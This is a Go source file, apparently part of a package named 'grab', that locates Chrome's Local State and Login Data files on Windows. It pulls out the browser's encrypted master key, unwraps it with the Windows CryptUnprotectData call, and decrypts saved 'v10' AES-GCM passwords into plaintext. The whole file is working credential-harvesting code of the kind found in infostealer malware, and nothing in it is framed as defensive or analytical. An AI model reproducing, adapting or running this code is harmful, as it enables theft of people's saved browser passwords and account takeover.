//go:build windows
// +build windows

package grab

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"os"
	"os/user"
	"runtime"
	"strings"
	"syscall"
	"unsafe"
)

const (
	WinChromeKeyPath  = "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
	WinChromePwDBPath = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
)

var (
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")
)

type ChromeUser struct {
	Username string
	OS       string
	HomeDir  string
	EncKey   []byte
}

type ChromePwObj struct {
	Data struct {
		EncKey string `json:"encrypted_key"`
	} `json:"os_crypt"`
}

func (cu *ChromeUser) GetChromeKey() error {
	if _, err := os.Stat(cu.HomeDir + WinChromeKeyPath); err != nil {
		return err
	}
	bytes, _ := os.ReadFile(cu.HomeDir + WinChromeKeyPath)
	pwObjStruct := ChromePwObj{}
	json.Unmarshal(bytes, &pwObjStruct)
	secretKey, err := base64.StdEncoding.DecodeString(pwObjStruct.Data.EncKey)
	if err != nil {
		return err
	}
	secretKey = secretKey[5:]
	finalKey, err := Decrypt(secretKey)
	if err != nil {
		return err
	}
	cu.EncKey = finalKey
	return nil
}

func (cu *ChromeUser) DecryptDetails(pass string) (string, error) {
	var plainpw string
	var err error
	if strings.HasPrefix(pass, "v10") {
		plainpw, err = cu.DecryptV80(pass)
		if err != nil {
			return "", err
		}
		return plainpw, nil
	} else {
		pwBytes, err := Decrypt([]byte(pass))
		if err != nil {
			return "", err
		}
		return string(pwBytes), nil
	}
}

func (cu *ChromeUser) DecryptV80(pass string) (string, error) {
	ciphertext := []byte(pass)
	c, err := aes.NewCipher(cu.EncKey)
	if err != nil {

		return "", err
	}
	gcm, err := cipher.NewGCM(c)
	if err != nil {
		return "", err
	}
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return "", err
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return "", err
	}
	return string(plaintext), nil
}

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func Decrypt(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func NewUser() (*ChromeUser, error) {
	u, err := os.UserHomeDir()
	if err != nil {
		return nil, err
	}
	user, err := user.Current()
	if err != nil {
		return nil, err
	}
	cu := &ChromeUser{
		HomeDir:  u,
		OS:       runtime.GOOS,
		Username: user.Username,
	}
	return cu, nil
}
